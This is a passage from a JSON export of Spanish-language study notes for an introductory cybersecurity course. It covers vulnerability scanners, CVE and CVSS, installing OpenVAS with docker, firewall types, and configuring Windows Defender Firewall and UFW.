    "content": "Hay muchas herramientas disponibles para realizar escaneos automatizados de vulnerabilidades, cada una ofreciendo diferentes funcionalidades.\n\n---------------------------\n<h2>Nesus</h2>\n[Nesus](https://www.tenable.com/products/nessus) fue desarrollado como un proyecto de c√≥digo abierto en 1998. Adquirido por Tenable en 2005 se volvi√≥ software de propiedad. Tiene una extensa lista de opciones de escaneo y es muy usado entre las empresas. Disponible en versiones gratuita y de pago. Aunque la gratuita tiene funciones limitadas.\n\n--------------------------\n<h2>Qualys</h2>\n[Qualys](https://www.qualys.com/) se desarroll√≥ en 1999 como una soluci√≥n de escaneo de vulnerabilidades basada en suscripci√≥n. Junto con escaneos continuos, ofrece comprobaciones de cumplimiento de normativa y manejo de activos. Alerta de forma autom√°tica las vulnerabilidades encontradas durante la monitorizaci√≥n continua. Lo mejor de esta herramienta es que es una plataforma basada en cloud, lo que significa que no tiene coste extra para mantenerla activa en nuestro hardware y manejarla.\n\n--------------------------\n<h2>Nexpose</h2>\n[Nexpose](https://www.rapid7.com/products/nexpose/) fue desarrollado por Rapid7 en 2005 como una soluci√≥n de manejo de vulnerabilidades de suscripci√≥n. Descubre continuamente nuevos activos en la red y realiza escaneos de vulnerabilidades sobre ellos. Da una puntuaci√≥n de riesgo de la vulnerabilidad dependiendo en el valor del activo y el impacto de la vulnerabilidad. Tambi√©n ofrece comprobaciones de cumplimiento de normativa con varios est√°ndares. Ofrece m√©todos de despliegue en cloud y en local.\n\n----------------------------\n<h2>OpenVAS (Open Vulnerability Assessment System)</h2>\n[OpenVAS](https://www.openvas.org/) es una soluci√≥n de escaneo de vulnerabilidades de c√≥digo abierto desarrollado por Greenbone Security. Ofrece funcionalidades b√°sicas con vulnerabilidades conocidas escaneadas a trav√©s de su base de datos. Es menos cara que las herramientas comerciales. Sin embargo, te da el sabor de un esc√°ner de vulnerabilidades completo. Es beneficial para organizaciones peque√±as y equipos individuales.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/2-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/2. Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "El escaneo de vulnerabilidades es la inspecci√≥n de sistemas digitales para encontrar debilidades. Las organizaciones llevan informaci√≥n cr√≠tica en su infraestructura. Deben escanear sus sistemas y redes regularmente en busca de vulnerabilidades, ya que los atacantes pueden usarlas para comprometer su infraestructura digital. Algunos est√°ndares recomiendan realizar ecaneos cada 3 meses mientras que otros anualmente.\n\nVimos c√≥mo de importante era realizar escaneos de vulnerabilidad regularmente. Sin embargo, buscarlas manualmente, pude ser muy cansado y podemos dejarnos muchas importantes. Para esto tenemos esc√°neres de vulnerabilidades automatizados.\n\nDespu√©s de identificar las vulnerabilidades, las organizaciones las arreglan haciendo cambios en el software o sistema. Estos cambios son los parches o patches.\n\n--------------------------------\n<h2>Escaneos Autentificados vs. No Autentificados</h2>\nLos escaneos autentificados requieren las credenciales del host en cuesti√≥n y son m√°s detallados que los no autentificados. Estos tipos de escaneos son √∫tiles para descubrir vectores de ataque dentro del host mientras que aquellos en los que no se requieren credenciales son √∫tiles para descubrir los vectores de ataque fuera del host.\n\n| Escaneo Autentificado                                                                             | Escaneo No Autentificado                                                                         |\n| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |\n| Se necesitan las credenciales del host en cuesti√≥n.                                               | No se necesitan las credenciales del host.                                                       |\n| Identifican las vulnerabilidades que los atacantes que tienen acceso al host pueden explotar.     | Identifican las vulnerabilidades que los atacantes que no tienen acceso al host pueden explotar. |\n| Ofrece una visibilidad m√±as profunda sobre el sistema escaneando su configuraci√≥n y aplicaciones. | M√°s sencillo de configurar y consume menos recursos.                                             |\n| Por ejemplo, escanear una base de datos interna dando las credenciales para el escaneo.           | Por ejemplo, escanear una web de cara al p√∫blico en busca de vulnerabilidades.                   |\n\n---------------------------\n<h2>Escaneos Internos vs. Externos</h2>\nLos escaneos internos se realizan desde dentro de la red, mientras que los escaneos externos se realizan desde fuera de la red.\n\n| Escaneo Interno                                                                        | Escaneo Externo                                                                           |\n| -------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |\n| Realizados desde dentro de la red.                                                     | Realizados desde fuera de la red.                                                         |\n| Se centra en las vulnerabilidades que pueden ser explotadas desde dentro de la red.    | Se centra en las vulnerabilidades que pueden ser explotadas desde fuera de la red.        |\n| Identifica vulnerabilidades que estar√≠an expuestas a los atacantes al entrar a la red. | Identifica vulnerabilidades que estar√≠an expuestas a los atacantes desde fuera de la red. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. CVE & CVSS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/4-cve-cvss/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/4. CVE & CVSS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Imag√≠nate como una persona sentada en el despacho de help desk de una oficina de IT gestionando a varios clientes. Lidias con cientos de quejas a diario respecto a varios problemas. Veamos c√≥mo los CVE y los CVSS pueden ayudarte a llevar un control de estas quejas y preguntas.\n\n----------------------------------\n<h2>CVE</h2>\nCVE significa Common Vulnerabilities and Exposures. Es un n√∫mero √∫nico para cada una de las quejas y preguntas. Si hay alguna actualizaci√≥n a un problema, puedes seguirlo f√°cilmente usando el n√∫mero CVE √∫nico. Saliendo del ejemplo, el CVE es un n√∫mero √∫nico dado a una vulnerabilidad. Fue desarrollado por la corporaci√≥n MITRE. Cuando se encuentra una nueva vulnerabilidad, se le da un identificador CVE √∫nico como referencia y se publica en la base de datos online de CVE. Esta publicaci√≥n apunta a hacer a las personas conocedoras de ellas para que las resuelvan.\n\n![[Pasted image 20251025173245.png]]\n- **Prefijo CVE:** Cada n√∫mero tiene el prefijo CVE al principio.\n- **A√±o:** En el medio aparece el a√±o en el que se descubri√≥ la vulnerabilidad.\n- **D√≠gitos arbitrarios:** La √∫ltima parte del n√∫mero CVE contiene 4 o m√°s d√≠gitos arbitrarios.\n\n-----------------------------\n<h2>CVSS</h2>\nCVSS significa Common Vulnerability Scoring System. Si volvemos al ejemplo del help desk, siempre necesitar√≠amos priorizar las quejas. La forma m√°s eficiente es por nivel de severidad. Si todas se registran con un nivel entre 0 y 10, donde 0 es el riesgo menor y 10 el mayor, se vuelve m√°s f√°cil decidir qu√© quejas atender primero. Este n√∫mero se calcula atendiendo a m√∫ltiples factores como el impacto, la facilidad de la explotaci√≥n, etc.\n\n|CVSS Score Range|Severity Levels|\n|---|---|\n|0.0-3.9|Low|\n|4.0-6.9|Medium|\n|7.0-8.9|High|\n|9.0-10|Critical|",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. OpenVAS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/5-openvas/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/5. OpenVAS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Como ya hemos visto, OpenVAS es un esc√°ner de vulnerabilidades de c√≥digo abierto. En esta tarea veremos c√≥mo realizar un escaneo de vulnerabilidades con √©l.\n\n-------------------------\n<h2>Instalaci√≥n</h2>\nUsaremos docker para instalar OpenVAS. Docker es una plataforma que nos ayuda a crear y distribuir paquetes de diferentes aplicaciones. Estos paquetes se conocen como containers. El container de una aplicaci√≥n tiene todas las dependencias ya instaladas dentro, por lo que no necesitamos pasar m√°s tiempo instal√°ndolas.\n\n```shell\nsudo apt install docker.io\n```\n\nDespu√©s de instalar docker en nuestra m√°quina, podemos proceder a instalar OpenVAS en un contenedor docker. Por simplicidad usaremos la imagen de docker proporcionada por [Immauss](https://immauss.github.io/openvas/) ya que encaja todo en una s√≥la imagen docker. Para instalar OpenVAS con todas las dependencias instaladas usaremos:\n\n```shell\nsudo docker run -d -p 443:443 --name openvas immauss/openvas\n```\n\n----------------------------\n<h2>Acceder a OpenVAS</h2>\nUna vez completada la instalaci√≥n, podemos acceder a la interfaz web de OpenVAS escribiendo en el navegador `https://127.0.0.1`.\n\nEsto nos llevar√° a la p√°gina de login de OpenVAS. Una vez que introduzcamos las credenciales correctas se abrir√° el siguiente dashboard:\n\n![[Pasted image 20251025194317.png]]\n\n---------------------\n<h2>Realizar un Escaneo de Vulnerabilidades</h2>\nAhora vamos a proceder a realizar un escaneo de vulnerabilidades en la m√°quina. El primer paso es crear una tarea dentro de la dashboard de OpenVAS. Rellenaremos los detalle de esta tarea y la ejecutaremos para empezar el escaneo.\n\nHacemos click en `Tasks` dentro de la opci√≥n `Scans`:\n\nLlegaremos a la p√°gina donde est√°n todas las tareas corriendo. No veremos ninguna tarea todav√≠a porque no hemos desplegado ninguna. Para crear una tarea, hacemos click en el icono de la estrella, luego en `New Task`:\n\n![[Pasted image 20251025194620.png]]\n\nIntroduce el nombre de la tarea y haz click en `Scan Targets`:\n\n![[Pasted image 20251025194803.png]]\n\nIntroduce el nombre de la m√°quina objetivo y su direcci√≥n IP y haz click en `Create`:\n\n![[Pasted image 20251025194859.png]]\n\nTendr√°s m√∫ltiples opciones de escaneo disponibles. Cada opci√≥n tiene su alcance de escaneo. Puedes estudiar los detalles de cada tipo y elegir acordemente. Despu√©s haz click en `Create`:\n\n![[Pasted image 20251025195023.png]]\n\nLa tarea se crear√° y ser√° mostrada en la dashboard \"Tasks\". Para iniciar el escaneo haz click en el bot√≥n `play` de la opci√≥n `Actions` de la pesta√±a:\n\n![[Pasted image 20251025195137.png]]\n\nTomar√° unos minutos completar el escaneo. Despu√©s de que se haya terminado, ver√°s el estado marcado como `Done`. Las visualizaciones dentro del dashboard de tareas mostrar√°n algunos n√∫meros indicando la severidad de las vulnerabilidades encontradas. Para comprobar los detalles debes hacer click en el nombre de la tarea:\n\n![[Pasted image 20251025195333.png]]\n\nPara ver los detalles de todas las vulnerabilidades encontradas durante el escaneo, puedes hacer click en el n√∫mero indicando la cuenta de vulnerabilidades encontradas en el host.\n\n![[Pasted image 20251025195441.png]]\n\nAhora que tenemos la lista de todas las vulnerabilidades encontradas en esta m√°quina y su severidad, podemos hacer click en cualquiera de ellas para ver m√°s detalles:\n\n![[Pasted image 20251025195629.png]]\n\nAl igual que otros esc√°neres de vulnerabilidades, OpenVAS nos permite exportar los resultados como reporte. Podemos extraer los reportes en cualquier formato desde la dashboard \"Tasks\".",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Vulnerability Scanner Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/0-vulnerability-scanner-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/0. Vulnerability Scanner Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "[[1. What Are Vulnerabilities]]\n[[2. Vulnerability Scanning]]\n[[3. Tools for Vulnerability Scanning]]\n[[4. CVE & CVSS]]\n[[5. OpenVAS]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What Are Vulnerabilities",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/1-what-are-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/1. What Are Vulnerabilities.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Imagina que vives en una casita encantadora. Un d√≠a observas que hay m√∫ltiples agujeritos en tu techo. SI no lo solucionas, eventualmente estos peque√±os agujeros podr√≠an causar graves problemas. Durante la lluvia se puede filtrar agua, insectos y suciedad puede entrar, etc. Estos agujeros son debilidades de tu casa y pueden causar problemas si no se tratan adecuadamente. Estas debilidades se conocen como vulnerabilidades. El proceso de arreglar estas vulnerabilidades se conoce como parchear.\n\nEn los dispositivos digitales estas debilidades a las que llamamos vulnerabilidades pueden estar en el software o el hardware y un atacante podr√≠a usarlas para ganar acceso a nuestra m√°quina. El problema de estas vulnerabilidades es que son m√°s dif√≠ciles de detectar que unos agujeros en el techo. Los atacantes siempre est√°n en su b√∫squeda, por lo que los defensores tambi√©n deben hacerlo para poder parchearlas.\n\n------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Escaneos de vulnerabilidades y sus tipos.\n- Herramientas usadas para el escaneo de vulnerabilidades.\n- Demostraci√≥n de esc√°ner de vulnerabilidades OpenVAS.\n- Ejercicio pr√°ctico.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Rules in Firewalls",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/3-rules-in-firewalls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/3. Rules in Firewalls.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Un firewall te da control sobre el tr√°fico de tu red. Aunque filtra el tr√°fico basado en reglas pre-configuradas, algunas reglas personalizadas pueden definirse para varias redes.\n\nLos componentes b√°sicos de una regla de firewall son:\n\n- **Direcci√≥n de fuente:** Direcci√≥n IP de la que proviene el tr√°fico.\n- **Direcci√≥n de destinaci√≥n:** Direcci√≥n IP a la que se dirije el tr√°fico.\n- **Puerto:** Puerto de comunicaci√≥n del tr√°fico.\n- **Protocolo:** Protocolo usado durante la comunicaci√≥n.\n- **Acci√≥n:** Lo que har√° el firewall cuando detecte que se cumple esta regla.\n- **Direcci√≥n:** Define si el tr√°fico es entrante o saliente.\n\n-----------------------------\n<h2>Tipos de Acciones</h2>\nHay tres tipos de acciones que un firewall puede realizar:\n\n<h6>Allow (Permitir)</h6>\nIndica que el tr√°fico que cumple con esa regla debe ser permitido. Una regla que permita el tr√°fico saliente por el puerto 80 usando HTTP ser√≠a:\n\n| Action | Source         | Destination | Protocol | Port | Direction |\n| ------ | -------------- | ----------- | -------- | ---- | --------- |\n| Allow  | 192.168.1.0/24 | Any         | TCP      | 80   | Outbound  |\n\n<h6>Deny (Prohibir)</h6>\nIndica que el tr√°fico que cumpla con la regla no debe ser dejado pasar. Una regla que deniegue el tr√°fico entrante por el puerto 22 v√≠a SSH ser√≠a:\n\n| Action | Source | Destination    | Protocol | Port | Direction |\n| ------ | ------ | -------------- | -------- | ---- | --------- |\n| Deny   | Any    | 192.168.1.0/24 | TCP      | 22   | Inbound   |\n\n<h6>Forward</h6>\nRedirige el tr√°fico a un segmento de red diferente usando reglas forwarding. Una regla que redirigiera el tr√°fico que entra por el puerto 80 hacia el servidor `192.168.1.8` ser√≠a:\n\n| Action  | Source | Destination | Protocol | Port | Direction |\n| ------- | ------ | ----------- | -------- | ---- | --------- |\n| Forward | Any    | 192.168.1.8 | TCP      | 80   | Inbound   |\n\n--------------------------------\n<h2>Direccionalidad de las Reglas</h2>\nLos firewalls tienen diferentes tipos de reglas, categorizadas en funci√≥n de la direccionalidad de su tr√°fico.\n\n- **Inbound:** Cuando se aplican al tr√°fico entrante.\n- **Outbound:** Cuando se aplican al tr√°fico saliente.\n- **Forward:** Cuando se aplican a redirecciones dentro de la misma red.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Linux iptables Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/5-linux-iptables-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/5. Linux iptables Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "En la tarea anterior hemos visto el firewall integrado de Windows. ¬øQu√© pasa si eres usuario de Linux? Sigues necesitando control sobre el tr√°fico de tu red. Linux tambi√©n ofrece un firewall integrado. Tenemos varias opciones, veamos r√°pidamente las m√°s usadas.\n\n----------------------------\n<h2>Netfilter</h2>\nEs un framework dentro de Linux con funcionalidades de firewall, incluyendo filtrado de paquetes, NAT, y registro de conexiones. Sirve como base para varios firewalls disponibles en Linux. Algunos firewalls que utilizan este framework son:\n\n- **iptables:** La utilidad m√°s com√∫nmente usada en las distribuciones Linux.\n- **nftables:** Es un sucesor de `iptables` que resalta el filtrado de paquetes y capabilidades NAT.\n- **firewalld:** Esta utilidad tambi√©n opera en el mismo framework pero funciona diferente a los otros y viene con zonas de red pre-configuradas diferentes.\n\n------------------------\n<h2>UFW</h2>\nUncomplicated FireWall elimina las complicaciones de la fabricaci√≥n de reglas d√°ndoles una interfaz sencilla.\n\nPara comprobar el estado del firewall:\n\n```shell\nuser@ubuntu:~$ sudo ufw status\nStatus: inactive\n```\n\nPara activarlo:\n\n   ```shell\n   user@ubuntu:~$ sudo ufw enable \n   Firewall is active and enabled on system startup`\n```\n\nAqu√≠ podemos ver una regla creada. As√≠ cambiamos la pol√≠tica de permisividad por defecto:\n\n```shell\nuser@ubuntu:~$ sudo ufw default allow outgoing\nDefault outgoing policy changed to 'allow'\n(be sure to update your rules accordingly)\n```\n\nPara denegar el tr√°fico entrante de un puerto:\n\n```shell\nuser@ubuntu:~$ sudo ufw deny 22/tcp\nRule added\nRule added (v6)\n```\n\nPara listar las reglas activas:\n\n   ```shell\n   user@ubuntu:~$ sudo ufw status numbered      \n   To                         Action      From      \n   --                         ------      ---- \n   [ 1] 22/tcp                DENY IN     Anywhere                   \n   [ 2] 22/tcp (v6)           DENY IN     Anywhere (v6)\n   ```\n\nPara borrar reglas:\n\n```shell\nuser@ubuntu:~$ sudo ufw delete 2\nDeleting:\n deny 22/tcp\nProceed with operation (y|n)? y\nRule deleted (v6)\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Types of Firewalls",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/2-types-of-firewalls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/2. Types of Firewalls.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Desplegar un firewall se volvi√≥ habitual en las redes despu√©s de que las organizaciones descubrieran su habilidad para filtrar tr√°fico da√±ino de sus sistemas y redes. Hay varios tipos de firewalls. Estos diferentes tipos tambi√©n pueden trabajar en capas OSI diferentes. Examinemos los m√°s comunes.\n\n![[Pasted image 20251024125154.png]]\n\n---------------------------------------\n<h2>Stateless Firewall</h2>\nEste tipo de Firewall opera en las capas 3 y 4 del modelo OSI y funciona √∫nicamente filtrando la informaci√≥n bas√°ndose en reglas predeterminadas sin tener en cuenta el estado de las conexiones previas. Esto significa que disparar√° alertas incluso si forman parte de una conexi√≥n leg√≠tima porque no tienen en cuenta  el estado previo de conexi√≥n. Sup√≥n que el firewall deniega unos paquetes de una fuente porque no cumple con las reglas. Idealmente, deber√≠a denegar los paquetes futuros, pero olvida lo anterior. Por esto, los paquetes futuros seguir√°n siendo tratados y matcheados como nuevos.\n\n------------------------------\n<h2>Stateful Firewall</h2>\nEste tipo de firewall va m√°s all√° de las reglas configuradas. Lleva un recuento de las conexiones anteriores y las guarda en una tabla de estado. Esto a√±ade otra capa de seguridad al inspeccionar los paquetes basados en su historial. Opera en capas 3 y 4 del modelo OSI. Sup√≥n que el firewall acepta unos paquetes de una fuente. En ese caso, tomar√° nota de esta conexi√≥n y permitir√° en el futuro. Aunque no es tan simple, funcionan en base a contexto. Por lo que no s√≥lo se fijar√° en conexiones antiguas.\n\n-----------------------------------\n<h2>Proxy Firewall</h2>\nEl problema de los firewalls anteriores es que ninguno tiene la habilidad de inspeccionar los contenidos de un paquete. Los firewalls proxy, intermedian la conexi√≥n entre la red privada e internet y operan en la capa 7 del modelo OSI. Inspeccionan el contenido de los paquetes. Se puede aplicar filtros por contenido.\n\n--------------------------------------\n<h2>Next-Generation Firewall (NGFW)</h2>\nEs el tipo de firewall m√°s avanzado y opera de la capa 3 a la 7, ofreciendo inspecci√≥n profunda de paquetes y otras funcionalidades que mejoran la seguridad del tr√°fico. Cuenta con un IPS que bloquea actividades maliciosas en tiempo real. Ofrece an√°lisis heur√≠sticos analizando los patrones de ataques y bloque√°ndolos instant√°neamente antes de llegar a la red. Los NGFWs tienen capacidad de desencriptaci√≥n SSL/TLS, lo que les permite inspeccionar los paquetes y correlacionarlos con las amenazas.\n\n--------------------------\n<h2>Resumen</h2>\n\n| Firewalls                 | Characteristics                                                                                                                                                                               |\n| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Stateless firewalls       | - Filtrado b√°sico  <br>- Sin registro de conexiones pasadas  <br>- Eficiente para redes veloces                                                                                               |\n| Stateful firewalls        | - Reconoce el tr√°fico por patrones <br>- Reglas complejas aplicables  <br>- Monitoriza las conexiones de red                                                                                  |\n| Proxy firewalls           | - Tambi√©n inspecciona la informaci√≥n dentro de los paquetes<br>- Ofrece filtro por contenido<br>- Ofrece control de aplicaci√≥n<br>- Desencripta e inspecciona paquetes de informaci√≥n SSL/TLS |\n| Next-generation firewalls | - Ofrece protecci√≥n contra amenazas avanzada<br>- Tiene un IPS integrado<br>- Identifica anomal√≠as en base a escaneos heur√≠sticos<br>- Desencripta e inspecciona paquetes SSL/TLS             |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Windows Defender Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/4-windows-defender-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/4. Windows Defender Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "<h2>Windows Defender Firewall</h2>\nEs un firewall integrado en Windows OS. Este contiene todas las funcionalidades b√°sicas para crear reglas que permitan o denieguen el tr√°fico y aplicaciones. Para abrir este firewall debes ir a la barra de b√∫squeda de Windows y escribir \"Windows Defender Firewall\". \n\nLa p√°gina de entrada de WDF muestra los perfiles de red y las opciones disponibles:\n\n![[Pasted image 20251024155230.png]]\n\n----------------------------\n<h2>Network Profiles</h2>\nHay dos perfiles de red disponibles. El firewall de Windows determina tu actual red basado en la NLA (Network Location Address) y te aplica ese perfil de red. Podemos tener diferentes configuraciones para cada uno de ellos.\n\n1. **Redes privadas:** Incluye configuraciones del firewall que aplicar cuando nos conectemos a una red privada, como la de nuestra casa.\n2. **Redes p√∫blicas:** Incluye configuraciones del firewall que aplicar cuando nos conectemos a una red p√∫blica, como una cafeter√≠a, restaurantes, etc.\n\nPara permitir/denegar alguna aplicaci√≥n en nuestros perfiles de red, hacemos click en la opci√≥n remarcada con un 1. Esto nos llevar√° a la p√°gina que lista todas las apps instaladas en nuestro sistema. Podemos marcar aquellas que queramos permitir. WDF est√° activado por defecto, pero si lo queremos apagar, podemos hacer click en la opci√≥n marcada con un 2. Esto nos llevar√° a los ajustes de ambos perfiles de red. Tambi√©n puedes hacer click en el 3 \"Restore Defaults\" para volver a los valores por defecto.\n\n![[Pasted image 20251024161249.png]]\n\n-------------------------\n<h2>Custom Rules</h2>\nWDF tambi√©n te permite crear reglas personalizadas para tu red. Creemos una para bloquear todo el tr√°fico saliente en el puerto 80 (HTTP) o 443 (HTTPS).\n\nAntes de crear esta regla comprobamos si podemos acceder a un sitio web:\n\n![[Pasted image 20251024161452.png]]\n\nPara crear esta regla elegimos \"Configuraci√≥n Avanzada\" de las opciones disponibles en la dashboard. Esto abrir√° una pesta√±a nueva.\n\n![[Pasted image 20251024161638.png]]\n\nAh√≠ podemos ver las opciones disponibles:\n\n![[Pasted image 20251024161656.png]]\n\nCrearemos una regla para bloquear todo el tr√°fico HTTP/S saliente. Para esto, hacemos click en \"Outbound Rules\" a la izquierda, despu√©s en \"New Rule\". Se abrir√° el configurador de reglas. Seleccionamos \"Custom\" y siguiente.\n\n![[Pasted image 20251024162515.png]]\n\nEn el segundo paso, seleccionamos \"All programs\". Te pedir√° el protocolo , seleccionamos TCP, mantenemos el puerto local como est√° y cambiamos el puerto remoto a \"Specific ports\". Escribimos los n√∫meros de los puertos (en nuestro caso 80 y 443). Le damos click a next.\n\n>[!NOTE] Separa los puertos con comas sin espacios (ej: 80,443).\n\n![[Pasted image 20251024164150.png]]\n\nEn la pesta√±a de alcance (scope), mant√©n las direcciones IP remotas y locales tal y como est√°n. En la pesta√±a de acci√≥n, habilita la opci√≥n \"Block the connection\" y presiona next.\n\n![[Pasted image 20251024164409.png]]\n\nEn la pesta√±a de perfil mantenemos todos los perfiles de red marcados. Por √∫ltimo, la fase final es darle un nombre a la regla y una descripci√≥n opcional y presionar **Finish**.\n\nPodemos ver que nuestra regla se ha configurado:\n\n![[Pasted image 20251024164540.png]]\n\nSi ahora comprobamos la regla vemos que no podemos acceder a ning√∫n servidor web por puerto 80 o 443:\n\n![[Pasted image 20251024164615.png]]\n\n---------------------------\n<h2>Exercise</h2>\nEl equipo de seguridad not√≥ tr√°fico entrante y saliente sospechoso en sus sistemas Windows cr√≠ticos. Crearon reglas en su WDF para bloquear algunos en espec√≠fico. Se te pide responder a unas preguntas.\n\n1. Nos conectamos con `xfreerdp3`:\n   ![[Pasted image 20251024165623.png]]\n   ![[Pasted image 20251024165751.png]]\n2. Buscamos el WDF:\n   ![[Pasted image 20251024165900.png]]\n3. Vamos a inbound y miramos el puerto 22:\n   ![[Pasted image 20251024170144.png]]\n   ![[Pasted image 20251024170205.png]]\n4. Buscamos la regla que permite que una IP en concreto acceda por SSH:\n   ![[Pasted image 20251024170313.png]]\n   ![[Pasted image 20251024170338.png]]\n5.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Firewall Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/0-firewall-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/0. Firewall Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "[[1. What is the Purpose of a Firewall]]\n[[2. Types of Firewalls]]\n[[3. Rules in Firewalls]]\n[[4. Windows Defender Firewall]]\n[[5. Linux iptables Firewall]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is the Purpose of a Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/1-what-is-the-purpose-of-a-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/1. What is the Purpose of a Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Hemos visto guardias de seguridad en la puerta de centros comerciales, restaurantes, ayuntamientos, etc. Estos guardias son los encargados de comprobar qui√©n puede entrar o salir y qui√©n no. Este guardia act√∫a como una pared entre el interior y exterior del recinto.\n\nMucho tr√°fico fluye a diario entre nuestros dispositivos digitales e Internet. ¬øQu√© pasa si alguien se cuela sin que lo pillen? Tambi√©n necesitamos un guardia de seguridad para nuestros dispositivos que pueda comprobar la informaci√≥n que entra y sale de ellos. Este guardia de seguridad recibe el nombre de **firewall**. Est√° dise√±ado para inspeccionar el tr√°fico de red entrante y saliente de un dispositivo. El objetivo es el mismo que el del guardia f√≠sico. Controlar qui√©n o qu√© entra y sale. Configuras el firewall d√°ndole reglas.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\nDespu√©s de completar esta unidad, tendremos conocimientos b√°sicos sobre:\n\n- Los tipos de firewalls.\n- Las reglas y componentes de un firewall.\n- Pr√°ctica con el firewall integrado de Windows.\n- Pr√°ctica con el firewall integrado de Linux.\n\n------------------------\n<h2>Pre-requisitos</h2>\n[[0. Networking Concepts]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. IDS Example - Snort",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/3-ids-example-snort/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/3. IDS Example - Snort.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
